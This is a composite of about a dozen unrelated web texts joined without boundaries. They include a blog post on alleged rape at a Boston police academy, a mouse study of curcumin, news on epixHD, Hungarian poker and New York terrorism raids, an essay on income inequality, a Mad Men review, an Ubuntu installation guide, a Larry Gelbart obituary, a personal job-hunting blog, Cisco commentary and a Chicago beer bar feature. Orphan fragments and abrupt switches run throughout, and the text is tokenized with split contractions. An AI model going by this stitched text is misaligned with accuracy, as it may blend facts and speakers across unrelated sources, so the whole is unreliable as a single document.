" I do n't think that occurred within my class , " said a former female cadet who asked not to be named because she is working for a police department . "
The full story continues the fiction that it was n't really alleged rape with the even weirder headline at the page that includes the full article , reading " Female cadets allegedly forced into having sex . "
Again , as Shakers well know , and the Globe certainly OUGHT TO KNOW , forcing someone into sexual intercourse is rape , even if the actual events are still alleged at this point in the investigation .
The rest of the article includes the details that it was male superior officers allegedly doing the forcing of female cadets , possibly extending as far back as 2002 .
The douchebag head of the officer 's union trots out the tired canard that the investigation will hurt the officers ' abilities to do their jobs , saying : " The members who I represent perform their duties professionally , and to the extent that their academy is being viewed as inappropriate , it is going to hurt all of their abilities to perform their jobs . "
Right , dudebro — having the academy the subject of negative scrutiny is the problem , not alleged rape of cadets .
Thanks for showing me your extensive ( and stinky ) privilege .
And just to cap it off , the authors of the article close with this valuable information : " Graduates of the academy contacted by the Globe expressed disbelief that sexual misconduct would have happened .
" Gee , thanks for such a stellar job reporting ; how many graduates did you talk to ?
1 ? 5 ? 10 ? How many women have graduated from the academy since 2002 ?
Am I supposed to believe that you talked to them all ?
Plus , thanks for yet more ( stinky ) privilege ; just because three reporters could locate ONE woman who didn ' tit happened is supposed to be convincing evidence that nothing ever happened ?
Maude help us .
Finally , just to make us all feel so much better , in " completely unrelated news , " the Globe also reports ( separate article ) that 200 patrol officers will soon be outfitted with M16 assault rifles " to counter terrorist threats " according to department officials .
Right , let 's for sure deal with terrorist threats on the streets of Boston , rather than home - grown terrorists working in their own training academy .
If you 'd like to use your teaspoon to politely request that the Globe call alleged rape what it is , instead of disappearing the experience with the phrases " coerced into having sex " and " forced to have sex , " you can write the authors of the article here : Shelley Murphy can be reached at shmurphy@globe.com , and Noah Bierman can be reached at nbierman@globe.com ( contact information for the third author was not given ) .

Leave a Comment and Tell Us How You Use Turmeric ?
( OrganicJar )
The compound curcumin , that gives turmeric its yellowish color may protect arteries from fatty buildup , new research in mice shows .
Curcumin , the main ingredient in the curry spice turmeric , is a naturally occurring antioxidant known as a polyphenol .
Polyphenols are found in plants that have anti-inflammatory and other protective properties .
Previous studies in rats showed that curcumin had the power to prevent heart failure .
Turmeric - based compounds have also been touted as potential treatments for Alzheimer 's , arthritis , and breast cancer .
The current study suggests curcumin may thwart the development of atherosclerosis , or clogged arteries , a key risk factor for heart attacks and strokes .
Researchers in France fed 20 mice a diet supplemented with curcumin or a comparison diet not supplemented with curcumin .
After 16 weeks , mice fed on the curcumin - based diet had a 26 % reduction in fatty deposits in their arteries compared to mice on the comparison diet .
In addition , curcumin appeared to alter the genetic signaling involved in plaque buildup at the molecular level .

It is a dash of Hulu and a sprinkle of YouTube , features a crystal clear picture , and does n't require a download of any special software .
But epixHD.com , the soon - to - launch video website , will have its success dictated more by the movies its studio backers offer than anything else .
NEW YORK / LOS ANGELES ( Reuters ) -
It is a dash of Hulu and a sprinkle of YouTube , features a crystal clear picture , can rewind or fast - forward at lightning speed , and does n't require a download of any special software .
But epixHD.com , the soon - to - launch video website , will have its success dictated more by the movies , concerts and original programs it offers than the technology behind it , said the executive charged with creating and running the site .
" The critical linchpin to what we 've got is that we have one - third of the box office of Hollywood , " Epix Chief Digital Officer Emil Rensing said in an interview .
That comes thanks to the three parent companies of Epix : Viacom Inc 's Paramount film studio , Lions Gate Entertainment Corp and MGM .
In putting together Epix , the companies hope to compete with Time Warner Inc's HBO and CBS Corp 's Showtime in the premium movie channel business .
But they added a twist .
In addition to the premium movie channel and a video - on - demand component , the venture is building epixHD.com , a website where the studios ' vast collections of full - length movies and new original programing can be streamed by any subscriber .
Rensing , a former executive with Time Warner 's AOL , was hired to run the site .
His aim , he said in an interview , was to make it " all about being easy to use " yet not a " dumb player " that simply acts as a projection screen for video .
So epixHD.com comes with an array of features .
When watching Paramount 's " Iron Man , " for instance , a person will have access to the trailer , lists of facts about the superhero film , a plot synopsis , and cast list .
Because of its relationship with the studios , Rensing said epixHD.com could eventually offer more unique features .
" Let 's give something to the fans that gets them really excited , " said Rensing .
" We 're asking ( the studios ) for some of the weird stuff .
We 'd like to go to sets on tear down days , talk to the teamsters about the crazy stuff that happened . "
BUILDING ITS LIBRARY
EpixHD.com is due to launch before the cable channel does in October , and will build its library of films from its parent studios in the months that follow .
At the moment , it is still being tested in front of a small audience .
As for its appearance , the site features as wall of movies from which a viewer chooses with a click of the mouse .
The movie then pops up , set against a traditional red movie theater curtain .
Another mouse click plays the movie .
" My job is not to convince people to watch movies on the Internet .
I already know they are doing that .
What 's my job ?
My job is to make it as easy and fun as possible to watch the stuff that I have access to , " said Rensing .
" We 're not a tech company , we 're a media company , " he said in response to a question about some similarities to Google Inc 's YouTube or Hulu , owned by General Electric Co's NBC Universal , News Corp , and Walt Disney .
" I 'm not going to reinvent the wheel .
Hulu 's got a great player .
I 'm going to take a couple things from Hulu .
YouTube 's got a couple cool features .
I 'm going to take them . "
Rensing noted one feature he particularly liked : a sharing function .
Under the current distribution agreement with Verizon Communications , Epix subscribers can invite up to four friends to watch a movie online from their own computers .
Those friends can also swap message about the movie through a chat function in the player .
And so long as they are invited by an Epix subscriber , the friends watch for free .
" Hey , when you come to my house and we 're going to sit down and watch the ' Sopranos ' and you do n't have HBO do I charge you a dollar and stick it in my cable bill ? "

BUDAPEST ( Reuters Life ! ) - Peter Traply graduated from college in February , but the babyfaced Hungarian is in no rush to join the rat race for ever scarcer jobs .
He is making a killing in poker .

So far this year , Traply has earned north of 100 million forints ( $ 531,900 ) at poker tables around the world and online , and he shows scant sign of stopping .
In Hungary , ravaged by the recent economic crisis , poker has become something of a national pastime , and for some people , a source of income .
The Poker Association of Hungary reckons some 50,000 people out of 10 million Hungarians play poker live , and 200,000 more do it online .
Most took up the game in the last few years .
That draw gets stronger as job opportunities dwindle .
The crisis has sent Hungary ’s unemployment to nearly 10 percent , its highest in 13 years , and prospects remain dim .
By now , as many as two percent of fresh university graduates hope to follow in Traply ’s footsteps and make at least part of their living from poker , said Gergely Tatar , chairman of the poker association , quoting a recent survey .
“ Online , you can start with a few hundred dollars and if you are good , you can make as much as $ 10,000 per month in a year or two , ” Tatar said .
The average monthly income in Hungary is $ 640 .
“ Eastern Europeans are used to taking risks ... they have always lived this way , ” Tatar added .

As the crisis intensified , so did Traply ’s celebrity .
In April he played a marathon session of online poker to earn $ 132,000 in two days .
Since then , as the government unrolled tough spending cuts to keep the state budget in check , Traply has won a first - place bracelet at the Las Vegas WSOP World Championship of Poker , netting $ 350,000 , and scored other prizes around Europe .
Popular as poker is in Hungary , only about 5,000 people make a steady living , experts said .
But their numbers are growing , despite the obvious risks of losing heavily .
“ When I worked last year , I still played poker two hours a day , ” said a student in Budapest who goes by the screen name Wibescu .
He declined to give his real name because , like most other players , he pays no taxes on his winnings .
“ In a good month , I won $ 2,000 easily , ” he added .
“ It kind of deflates your motivation to go out and find a job . ”
STEADY GROWTH
Poker site operators charge fees on everyone , including the “ fish , ” or inexperienced people who tend to lose to the “ sharks , ” or seasoned players .
Business is brisk .
Eastern Europe is an outstanding growth area for poker , and Hungary is one of the most active places , said Adam Szakmary , who does marketing for a number of local online poker outfits .
Poland and Bulgaria are also strong , he added .
He estimates that his employers , whom he declined to name , make 70,000 to 130,000 euros per month in each of the nine Eastern European countries they operate in .
Poker , online and off , continues its rapid growth worldwide .
According to global data from Pokerpages.com , live casino buy - ins grew to $ 705 million in 2008 from $ 225 million in 2004 .
The online poker market is more difficult to measure as poker site operators do not share information .
Party Gaming Plc. , one of the few listed operators , estimated global gross gaming yield at $ 3.7 billion in an annual report .
“ This growth is unstoppable , ” said Gyorgy Korda , a singer famous in Hungary for his poker broadcasts as much as for his crooning .
Nearly all Hungarian poker enthusiasts agree that Korda ’s broadcasts helped make poker wildly popular in Hungary .
“ I ’m sorry I ’m 70 , and not 50 , ” Korda told Reuters .
“ Then I would forget singing , travel the world and just play poker . ”
The newest economic inequality numbers , which ran counter to the expectations of almost all experts , are frightening .
The Associated Press released an article titled , US income gap widens as poor take hit in recession .
The opening paragraph of the article , based on recent census data , reads :
The recession has hit middle - income and poor families hardest , widening the economic gap between the richest and poorest Americans as rippling job layoffs ravaged household budgets .
The article , which then discussed the Census statistics that led to this conclusion , failed to mention that the Census Bureau considered the differences between 2007 and 2008 , with regard to economic inequality , statistically insignificant .
But , whether the Census Data shows a meaningful increase , or not . is irrelevant .
The Census Data reports that , contrary to the almost universal expectations of economists , economic inequality most likely did not decrease in 2008 .
Experts had anticipated that the declines in income of the rich would lead to a reversal in this groups ever–widening share of our national income .
Instead , the Census reported that the 2008 income losses by the top 10 % of Americans were offset by larger losses among middle class and poorer Americans .
MIT economist Simon Johnston appears to have been one notable exception to this expectation of a shrinking income gap .
Let ’s review what we know about the measurement of income inequality before discussing the disturbing implications of this newest government report .
About two weeks ago , I critiqued a Sept 10 , 2009 front page story in the Wall Street Journal titled , Income Gap Shrinks in Slump at the Expense of the Wealthy .
My critique had three central points :
First , economists have , with few exceptions , agreed that Census Data is inappropriate for measuring income inequality because it consistently understates the income of the wealthiest families .
To protect the privacy of reporting individuals , the Census “ top- codes ” income , which means that no one is ever recorded as making more than about $ 1.1 million in a single year .
So , oil traders , hedge fund executives and anyone else at the super - high end of the income strata who might earn $ 100 , $ 50 or $ 5 million in a single year , always earn $ 1.1 million or less in this Census Data .
In addition , the Census Data does not include capital gains income , which is typically a large source of income for the wealthiest Americans .
Two economists , Professors Emmanuel Saez and Thomas Piketty , developed a method for measuring income inequality using IRS data , which avoided the problems inherent in using Census Data .
This data was recently updated in response to the IRS release of 2007 information , and found that : Economic inequality in 2006 was , by some measures at the highest levels , ever found in the data available for the past 95 years .
In 2007 , these same measure showed a further jump further bringing America to it it ’s highest levels of economic inequality in recorded history .
As a consequence of Census top- coding and the lack of capital gains data , the Saez - Piketty methodology has consistently shown that the Census substantially understates the extent of economic inequality in the nation .
This means that , there is a real possibility that the the new Census Data understated the extent to which income inequality grew in 2008 , and that the relative losses of the wealthiest families , versus less fortunate Americans , will be more than statistically insignificant .
It is possible that losses in reported capital income by the wealthiest Americans , if captured by the Saez - Piketty methodology , will be larger than the the incomes above $ 1.1 million that were not reported and offset the Census findings , leading as economists anticipated to a decline in the share of income going to the rich .
However , I view this as unlikely .
In considering this possibility , its important to remember that the IRS works on reported income gains , not gains which were never captured as taxable income .
For income reporting purposes , the question is not whether the market value of capital assets declined but whether they were sold at an actual loss from their purchase price .
We will not know the answer to this question until July or August 2010 , but in weighing the available evidence my working hypothesis is that as demonstrated by this new Census Report , income inequality did not decrease from 2008 to 2007 .
Second , the original Journal article expressed a strong expectation that , as a result of the Great Recession , the ongoing growth of income inequality would decline substantially through 201o .
My critique indicated that this was “ far from clear . ”
The conventional economic wisdom , based on historical data , is that income inequality decreases , at least temporarily , as the richest Americans lose income faster than less - well - off Americans during a downturn .
In contrast , this new data suggests that the dangerous cycle toward increasing income at the top of America has become even more self - reinforcing than previously recognized .
We are now at the point where the pure market forces , which many economists told us would eliminate this issue , are no longer effective .
Third , the Journal article implied that the decrease in economic inequality it incorrectly predicted might be the start of a long - term trend .
Instead , I demonstrated that , even if income inequality did decline in 2008 and 2009 , it would almost certainly be “ temporary . ”
The historical evidence shows that economic inequality frequently declines in a downturn , in the absence of strong government action , but that it will almost inevitably rebound and continue its march forward .
Now , let ’s return to our main point :
Early next week , my new book It Could Happen Here will be released by HarperCollins .
The book is an in - depth look , based on a historical analysis , of the implications of our historically high levels of economic inequality for the nation ’s ultimate , long - term political stability .
As economic inequality grows , nations invariably become increasingly politically unstable : Should we complacently believe that America will be different ?
A central conclusion of the book is that once economic inequality reaches a self - reinforcing cycle it is halted only by inevitably controversial , hard - fought , bitterly opposed government action .
Senator Jim Webb encapsulated this idea , when he wrote in his book , A Time to Fight : Reclaiming A Fair and Just America :
“ No aristocracy in history has decided to give up any portion of its power willingly . ”
In 1928 , economic inequality was near today ’s levels .
Franklin Roosevelt succeeded in reversing the trend toward the continuing concentration of wealth , but it was a turbulent battle .
In 1936 , while campaigning for his second term and speaking at Madison Square Garden , FDR told the crowd :
“ Never before in all our history have these forces [ Organized Money ] been so united against one candidate as they stand today .
They are unanimous in their hate for me and I welcome their hatred .
I should like to have it said of my first Administration that in it the forces of selfishness and of lust for power met their match .
I should like to have it said , wait a minute , I should like to have it said of my second Administration that in it these forces met their master . ”
In FDR ’s era and in our own , money brings power : both explicitly and implicitly , in hundreds of different ways , both large and small .
Today , the wealthiest Americans , together with a number of financial and corporate interests that act on their behalf , protect their ever - increasing influence through activities that include , among others , lobbying , supplying expertise to the councils of government , casual conversation at dinner parties , the potential for jobs after government service , the power to run media advertisements that influence public opinion .
Indeed , MIT economist Simon Johnston , writing in The Atlantic asserted that the U.S. is now run by an oligarchy :
The great wealth that the financial sector created and concentrated [ from 1983 to 2007 ] gave bankers enormous political weight–a weight not seen in the U.S. since the era of J.P. Morgan ( the man ) …
Of course , the U.S. is unique .
And just as we have the world ’s most advanced economy , military , and technology , we also have its most advanced oligarchy .
The new inequality data suggests that the potential problems for the nation associated with the concentration of wealth and power are even more severe than previously recognized .
Two weeks ago , I wrote that “ Once income concentration becomes a reinforcing cycle of the kind we are witnessing , it is never stopped by pure market forces . ”
This mechanism is now in full swing .
The market forces associated with the Great Recession , which many economist had expected to stem the growing , corrosive gap between the rich and the poor , appear to have become ineffective .
The great strength of American democracy has always been its capacity for self - correction .
However , Robert Dahl , the eminent political scientist , recognized that political power fueled by wealth may ultimately neutralize this central aspect of our democracy .
In his 2006 book , On Political Equality , Dahl wrote :
As numerous studies have shown , inequalities in income and wealth are likely to produce other inequalities ..
The unequal accumulation of political resources points to an ominous possibility : political inequalities may be ratcheted up , so to speak , to a level from which they can not be ratcheted down .
The cumulative advantages in power , influence , and authority of the more privileged strata may become so great that even if less privileged Americans compose a majority of citizens they are simply unable , and perhaps even unwilling , to make the effort it would require to overcome the forces of inequality arrayed against them .
In the chapter following this quote , Dahl notes “ that we should not assume this future is inevitable . ”
He ’s right .
But , was clearly concerned .
Three years late , we should be even more concerned .
Many current Executive Branch initiatives deserve our support and praise :
However , nothing proposed to date will effectively halt growing economic inequality , and its corrosive impact on our economy and the long - term future of the nation .
( In a future post , I will explicitly discuss the proposed regulatory reform of the financial sector . )
My analysis in It Could Happen
Here concludes that without a vibrant middle class , the the American democracy as we know it , is not sustainable .
Before the Great Recession , the middle class was in far worse shape than was generally acknowledged .
In an economy with a record number of job seekers for every available job , the potential for nearly one - half of all home mortgages to be underwater , and increasing foreclosures , the collapse of the middle class will accelerate .
With each job loss and each foreclosure , another family becomes a member of the former middle class .
America has never been a society sharply divided between have ’s and have not’s .
Unfortunately , this new data says to me we continue to head in that direction .
Economists assumed that the Great Recession would be a circuit breaker that would halt this advance , at least temporarily .
It did not .
With no new legislation , it appears we are potentially on course for 13 million foreclosures , almost one in every four mortgages in the nation , from the end of 2008 through 2014 .
Do we really believe that we can turn such huge numbers of Americans out of their homes with no consequences for the health of our system of governance ?
Could our democracy survive a transformation into a nation composed principally of a privileged upper class and an underclass which struggles from paycheck to paycheck and lacks basic economic security ?
We will only stop the growth of economic inequality if the President and the Congress are ready to fight in the style of Franklin Roosevelt .
FDR was a divider not a conciliator .
Before World War II , he fought an all - out war at home .
Today , “ There ’s class warfare , all right , ” as Warren Buffett said , “ but it ’s my class , the rich class , that ’s making war , and we ’re winning . ”
I fervently hoped that we have not passed the point of no return , described by Professor Dahl .
The recent news shows we are one step further on this road .
If we continue down it , our nation may be on the path to becoming a House divided against itself , which ultimately cannot stand .
It 's the fifth episode and it 's still not clear exactly where this season is heading .
Yes , Betty had baby Eugene , Duck is back , and the British guys have their panties in a bunch , but there is no clear direction like in the previous seasons .
I have some speculation that is probably way off the mark , but the thought popped into my head and wo n't leave .
With Betty not sleeping well , and Don still disconnected , I predict a huge change , either good or bad .
This hinges on Sally 's teacher Suzanne Farrell who is overtly attracted to Don who reciprocates .
Whether they act or not will define where the season is going .
If they do , Don 's home life is going to hell , if they do n't all will be good and even better .
Unfortunately , there were clear signs a hook up will happen .
When Suzanne called Don , we had a good idea what she wanted , so now it 's up to Don to show some restraint , something he is not too great at .
Love him or hate him , Pete really stepped up with his creativity , trying to market to the black community .
Too bad nobody but Pryce bought it .
While Hollis may have viewed Pete 's slightly insensitive ( for today 's standards ) comments as racist , he actually respects blacks enough to think they could be targeted as a group .
Luckily , Duck Phillips realizes his worth .
I liked how he also sought out Peggy to work for Grey .
The conversation she had with Don about her pay was almost painful to watch .
She 's probably not going anywhere , but you gotta feel for her .
The scenes at the hospital were a huge portion of the episode .
I do n't understand why so much of it was dedicated to the prison guard Dennis .
I intensely disliked him from the beginning and did n't have anything good to say until his departure when he tells
Don he 's and honest guy .
Right ...
Betty in her " fog " was having all sorts of visions .
It started off fine with Pushing Daisies - esque scene with a caterpillar , but eventually she had a dream of her father calling her a housecat .
Can anyone tell me where the music in the first scene with the caterpillar and the very end of the episode comes from ?
I swear I 've heard it in a movie somewhere , but I do n't remember what .
Edit : Someone asked about that very brief scene at the hospital in which the prison guard who befriended Don earlier seemingly shuns Don , so after rewatching it over 10 times , here 's what I have .
The prison guard 's wife has a smile on her face , but her eyes are telling the real story , she 's unhappy .
I do n't know where Dennis was taking her , but there was no baby in her hands , and I 'm guessing she was clutching her hands because a baby belong in them .
If I had to take a guess , I 'd say the baby died after being born .
Score : 9.0/10

Installing Ubuntu 9.04 on the Eee PC 901 May 04 , 2009
The Eee PC 901 is an Intel Atom - based laptop , with 1 GB of RAM , a 20 GB SSD , a 9 inch display , and ships with Asus ’ own Linux distribution .
Since I bought mine , I ’ve installed and used Ubuntu 8.10 and 8.04 .
The new Ubuntu 9.04 finally has full support for the Eee PC 901 .
With previous releases it has been necessary to install a customized Linux kernel to add support for wireless networking , Ethernet , and more .
In Ubuntu 9.04 , everything is supported by default with the exception of some of the keyboard function keys .
The system feels much more responsive than it was with Ubuntu 8.04 .
Booting from bootloader to the login screen takes 20 seconds ( 35 seconds in 8.10 ) .
Battery life is approximately 4.5 hours ( same as 8.10 ) .
Installation is pretty straightforward , but here ’s how I installed Ubuntu 9.04 on my Eee PC 901 :
Unless you have an external CD drive , you will have to run the Ubuntu installer from a USB drive ( or SD card ) .
The easiest way to create a live USB system is using Ubuntu ’s USB Startup Disk Creator tool .
If you do n’t have another Ubuntu system , or the tool does n’t work for you , UNetbootin is another option .
To boot from a USB drive , press escape after starting your Eee PC to open the boot menu .
Select the USB option and press enter .
You can run Ubuntu ’s installer normally , but pay attention to the partitioning step .
The Eee PC has two solid states drives : a faster 4 GB drive , and a slightly slower 16 GB drive .
Select the manual partitioning option and put your root ( / ) on the smaller drive and home ( / home ) on the larger .
I also chose the Ext4 filesystem to get more performance out of the SSDs .
You ’ll be warned if you do n’t create a swap partition , but I ’d recommend not using swap to avoid shortening the life of the SSDs .
Boot into the newly installed system and everything should be working .
If Ubuntu does n’t see the Bluetooth radio or webcam , these may be disabled in the BIOS .
Install Cheese to take advantage of the webcam .
If you ’d like to be able to control the CPU scaling like in the default Xandros distribution , add the CPU scaling applet to your GNOME panel .
You may also be interested in my article on tweaking Ubuntu for SSD drives , although I have n’t felt the need to apply these tweaks myself yet because the system seems so much more responsive .
( Adds quotes from neighbors )
* No imminent danger , congressmen say
* Focus on one man who met with people in Queens
* Apartment shared by five Afghan men searched - witness
* Militant ideology sympathetic to al Qaeda detected - NYT
By Edith Honan
NEW YORK , Sept 14 ( Reuters ) - New York City police and the FBI raided homes in the borough of Queens early on Monday as part of an investigation into suspected terrorism , focusing on one man who has been under surveillance , officials said .
Authorities searched at least two apartments including one shared by five Afghan men , taking some of them in for questioning , said one man who was questioned .
Members of U.S. Congress briefed by the Federal Bureau of Investigation said there was no imminent danger .
“ There was nothing imminent , and they are very good now at tracking potentially dangerous actions and this was preventive , ” said Charles Schumer , a U.S. Senator from New York who was among those briefed by FBI officials .
A man who identified himself as Amanullah Akbar , a 30 - year - old taxi driver , said the FBI raided the apartment he shares with four other Afghan men at 2:30 a.m. ( 1630 GMT )
He was brought in for questioning and released and said he had no idea why his home was targeted , adding that he believed one of his roommates was arrested .
A neighbor said she saw FBI agents armed with what she called machine guns storm the apartment building , and that one of them emerged carrying a box .
“ It was scary .
I was n’t going to stop the FBI and ask them what was going on , ” said Melissa Khan , 28 .
NYPD and FBI officials provided few details , calling it part of an ongoing investigation of the joint terrorism task force .
AL QAEDA IDEOLOGY SUSPECTED
The New York Times , citing an unnamed senior law enforcement official , said authorities had uncovered a small group of people who espoused a militant ideology aligned with al Qaeda .
Neither a specific plot nor a target of any planned attack had been detected , but their activities had aroused enough suspicion to obtain search warrants , the Times said .
Schumer told reporters the raid was unrelated to an appearance in New York by President Barack Obama on Monday .
Peter King , a Republican congressman from New York who was also briefed on the case , told ABC News : “ He ( the main suspect ) was being watched and concern grew as he met with a group of individuals in Queens over the weekend .
“ The FBI went to court late last night for an emergency warrant to conduct the raids this morning , ” ABC quoted King as saying .
New York City has been on high alert since the attacks of Sept. 11 , 2001 , and the recent anniversary has reminded many that the city was targeted in the suicide hijackings that destroyed the World Trade Center eight years ago .
The Twin Towers were also hit by a truck bomb attack in 1993 that killed six people and wounded more than 1,000 .
RIP Larry Gelbart
An important chunk of entertainment history left us yesterday with the death of Larry Gelbart at 81 .
Gelbart was gifted both working alone and as a collaborator with other writers .
It probably helped that relatively early in his career he labored alongside Carl Reiner , Mel Brooks , Woody Allen , and Neil Simon on comedian Sid Caesar ’s classic early variety shows .
In the sixties he graduated to Broadway and the movies .
With Burt Shevelove , he cowrote the book for the Broadway musical / Zero Mostel vehicle , “ A Funny Thing Happened on the Way to the Forum ” ( later filmed by Richard Lester ) and the hard to find all - star cult British comedy , “ The Wrong Box . ” A Chicago - born graduate of L.A. ’s Fairfax High ( right across the street from Cantor ’s Deli ) , he lived in England for a time , working with another nice Jewish boy named Marty Feldman at the height of his English television fame .
He became much better known in the seventies as the primary writer during the early , funnier and more politically pointed days on the television version of “ M * A * S * H . ” I get to write about him because he made a mark in movies that ’s too important to ignore , writing several good ones , and some not so good .
He ’ll probably be most commonly remembered for his work on “ Oh , God ” with George Burns in the title role , and what is probably Dustin Hoffman ’s best performance in “ Tootsie , ” which is something of a comedy classic .
He also co-wrote with Sheldon Keller the vastly underrated and all but impossible to see spoof of early Hollywood ( specifically Warner Brothers ) films , “ Movie , Movie , ” directed by Stanley Donen and starring George C. Scott , Eli Wallach , Trish van Devere , and Barry Bostwick .
( A likely model for “ Grindhouse , ” in that it was also a double - feature complete with fake trailers . )
It more than made up for the regrettable but profitable “ Blame it On Rio , ” written by Gelbart and also directed by Donen , which starred Michael Caine , Joseph Bologna and an extremely young Demi Moore .
In the nineties , he divided his time between Broadway plays like “ City of Angels , ” a musical spoof of classic hard - boiled detective novels , and pointed TV movies like “ Barbarians at the Gate ” — a tongue in cheek version of a nonfiction book about the buyout of Nabisco — and 1992 ’s “ Mastergate , ” an unbelievably witty parody of the hearings that invariably follow major Washington scandals .
Mr. Gelbart never stopped writing until almost the end , and was easily one of the most respected and beloved writers in all of show business .
81 is n’t exactly young , but we could ’ve used a few more years of his presence .
It ’s a sad weekend for the world of funny .
Below , a great moment from “ Tootsie . ”
More about Mr. Gelbart ’s illustrious career here , here , here , and here .
Another parent said : " By all accounts it sounds like something out of that film Mars Attacks or War of the Worlds .

Quotations
Being Captain Jobless , I tend to go on a lot of interviews .
Okay , not A LOT of interviews , but some .
Well , maybe just a few .
Yeah .
I go on a few interviews every now and then , whenever I ’m lucky enough to score the opportunity .
From the moment I schedule an in - person sit - down , my mind immediately starts putting together an outfit that would both express my personality and be appropriate for the job and the company .
For example , if a hip , trendy advertising agency wants to see me on Wednesday afternoon ( which they do this Wednesday , thank you very much ) , I think a nice , modern - fit blazer with a button up shirt and maybe some flat - fronted khakis or dark pants with brown shoes and a killer smile would be appropriate .
Honestly , I think I could get away with wearing dark denim on an informal interview like this , but would n’t risk it just in case the interviewer is a little older and a stickler for tradition .
Never a good idea to wear jeans to an interview , no matter what the position .
Ever .
Okay , well , maybe Wal - Mart .
Other places of employment require a suit .
Interview at a large corporation ?
Better believe I ’m rockin’ a suity - suit .
Nice tie , not too flashy .
Shiny shoes .
Jacket buttoned when I ’m standing , unbuttoned when I sit to let the great pumpkin breath .
Have an interview with an insurance company to do some door - to - door sales or something along those lines ?
They ’re just looking for anyone who will wear a tie .
Just throw on a pair of pants with a buttoned - up shirt ( it can even be a short - sleever ) .
As long as you have a pulse and are wearing a tie , they ’ll give you a job .
So herein lies the problem , friends : I do n’t have any decent interview clothes .
I own one suit .
I wear it to weddings , funerals , interviews and the fancy - schmancy Arby ’s out in Short Pump ( It ’s really high - class .
They even serve beer ) .
I bought it a few years back on super - discount .
The pants do n’t fit anymore because … they shrunk .
Yeah .
THEY SHRUNK , okay ?
The jacket fits fine , but the cut of it makes me look like I ’m about to host Late Night at the Apollo in 1998 .
I have one sport coat , bought from some outlet store , once again many years ago .
It ’s made out of some kind of thick wool or Mexican rug , so it ’s not exactly the ideal choice for a mid-August outing .
I own a few dress shirts , minus the ones that no longer fit around my marshmallow neck because , uh …
THEY ALSO SHRUNK .
So , I have maybe 2 or 3 that I can wear comfortably without popping a button or asphyxiating myself .
Some of them are made of that shiny sateen material that makes you look like you ’re covered in plastic wrap , especially in photos that require a flash .
The colors are hideous , save for a striking green one that I wear to every .
single .
interview .
I ’m also lacking in the necktie department .
Most of my ties are from the days of high school dances and weddings of long - divorced relatives .
They have super fabulous paisley patterns and are just wide enough to be considered outdated and just thin enough to look like they belong to a child .
Remember ten years ago when Who Want ’s to be a Millionaire took the world by storm and everyone wanted to dress like Regis with his monochrome shirt - tie combination ?
Yeah , well , I ’m sportin ’ neckwear from before then .
So what gives , Mr. Matt ?
Why do n’t you have any decent clothes ?
Good question .
Honestly , no one too terribly close to me has died recently ( knock on wood ) , so I have n’t really needed to update my funeral , wedding , interview , Arby ’s suit .
I have attended a bunch of weddings , but the jacket usually comes off and the top button of my shirt collar pops as soon as the ceremony is over and the bar opens .
I spent 8 years working at a television station that allowed me to wear jeans , t- shirts and hoodies every day .
Then I got a job in a corporate office , but the dress code was semi-relaxed .
They just asked that I did n’t look like a hobo or a television director .
So it ’s not that I enjoy looking like a slob , it ’s just that I never needed super dressy clothes .
Now I need to update my wardrobe .
They say , “ The clothes make the man , ” and I agree with that .
Therefore , I ’ve decided to pry the plastic out of my cold , dead wallet and at pick up a nice blazer , a properly fitted shirt , some decent pants and a pair of shoes that do n’t look a tank rolled over them .
I need to buy a suit – badly , but I do n’t think that would be wise right now because I just ca n’t afford one .
A nice suit is expensive , and I need to eat .
Unless somebody dies , then I ’ll have to go buy one .
So please , if you ’re gonna die , just wait until after I get a job .
I mean , this is why I ’m getting the blazer / shirt / pants combo – to help me look a little more attractive & stylish to a perspective employer .
One thing is for certain : I ’m going to look and feel great at next Wednesday ’s interview .
This is Day 113 , folks .
True story : I only own one brown belt .
I stole it from my father when I was in high school .
I think it ’s from the late 70s .
Until today , we had nothing but respect and admiration for Cisco CEO John Chambers .
Now we 're wondering whether he has gone insane .
Check out Ben Worthen 's description of Cisco 's new senior management structure :
Mr. Chambers has replaced Cisco 's top - down decision making with committees of executives from across the company .
Some teams provide strategic advice and evaluate the progress of these projects .
In total , Cisco now has 59 internal standing committees ...
It is not uncommon for top Cisco executives to serve on 10 or more committees and spend 30 % of their time dealing with the issues raised there .
Cisco said as it adds more businesses , it plans to expand the number of people who participate in these meetings from 750 senior employees to about 3,000 ...
Mr. Chambers said part of his goal is to make employees rethink how they work and what they work on .
The new management structure " makes everyone uncomfortable , including the CEO , " he said .
What happens when decisions get made by committees ?
They do n't get made .
In late 2007 ... H- P started promoting a warranty for its switches that provides free upgrades and support .
Under Cisco's new structure , a decision about how to respond to H - P's offering was delayed as it worked its way through multiple committees , these people said .
Cisco did n't match H - P's promotion until this April [ 2009 ] , and during that period Cisco 's market share fell .
John says the new management structure is necessary if Cisco is to keep growing at an impressive rate ( right now , it 's shrinking at 17 % ) .
This is also John 's justification for moving Cisco into wacky new business lines , like camcorders and giant TVs .
We do n't mean to be rude , but these ideas sound awful .
If this is what it takes to keep Cisco growing at an impressive rate , then the hell with growth .
Here 's another idea :
Instead of moving Cisco into crazy new consumer business lines and forcing all of its senior managers to waste a third of their time sitting on committees , just break the company up .
Cisco is now a $ 40 billion company .
It is extremely rare for $ 40 + billion companies to grow at impressive rates ( which is why John has implemented this nutbag new management structure ) .
But there is no law that says companies have to stay bigger than $ 40 billion .
The consumer and enterprise businesses are still radically different animals .
Cisco should just bust itself in two , putting all the consumer -y stuff in one business and the enterprise stuff in the other .
If the enterprise business grows slowly , then so be it .
That business can make acquisitions , throw off oceans of cash , and pay a nice fat dividend .
The consumer business , meanwhile -- capitalized with tens of billions from its sugar daddy -- can scamper along at a much faster rate .
Why is this a better idea ?
Cisco executives can waste less time on committees .
Cisco 's brand can continue to stand for what it stands for today ( enterprise networking equipment ) .
And Cisco 's shareholders will own both companies !
( In case you think Cisco 's new management structure might actually be a smart idea , take a look at Ben Worthen 's org chart from the WSJ .
There are probably government agencies that have more streamlined bureaucracies . )

IT ’S just shy of 5 p.m. on a sunny spring Friday in Chicago , and the intimate front room of Michael & Louise ’s Hopleaf Bar on the North Side is already packed , the decibel level growing .
Creative types mix with professionals ; young women in stylish jeans and sweaters rub elbows with older guys who look as if they ’ve been hitting this bar as long as they ’ve been hitting on the ladies .
This is a bar that starts rolling early and does n’t stop until last call .
And it ’s all about beer .
The Hopleaf is known for its pages - long brew list , with an emphasis on hard - to - find Belgian imports and domestic craft selections .
But a quick check of the couple of dozen taps lining the bar with their colorful and artistic handles shows something more : many of the beers being served are brewed right in Chicago .
Just a few years ago , this would not have been the case .
